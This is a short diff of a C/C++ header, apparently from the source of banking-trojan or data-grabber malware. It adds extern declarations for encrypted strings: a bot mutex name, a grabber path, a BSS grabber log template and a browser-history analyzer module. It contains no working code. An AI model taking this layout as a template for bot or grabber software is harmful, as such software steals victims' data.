@@ -30,6 +30,12 @@ string GetStr(const char* EncryptedStr);
 //=====================================================
 //  Публичное объявление строковых данных
 //=====================================================
+
+// Префикс глобального мьютекса сигнализирующего, что бот запущен
+extern CSSTR StrBotGlobalMutexName[];
+
+
+
 extern CSSTR StrBotWorkPath[];
 extern CSSTR StrGrabberPath[];
 
@@ -68,13 +74,25 @@ extern CSSTR HTTPOctetStream[];
 extern CSSTR AzConfigParamUserName[];
 
 
+// Строки модуля BSS грабера
+extern CSSTR BSSLogTemplate[];
 
-//Не шифрованные строки и данные
+
+// Строки модуля HistoryAnalyzer
+extern CSSTR StrHistoryAnalizerCommandParams[];
+
+
+
+
+
+//*********************************************************************
+//                            Не шифрованные строки и данные
+//*********************************************************************
+
+
 extern CSSTR Slash[];
 extern CSSTR SlashChar;
 
-// Строки модуля BSS грабера
-extern CSSTR BSSLogTemplate[];
 
 
 #endif
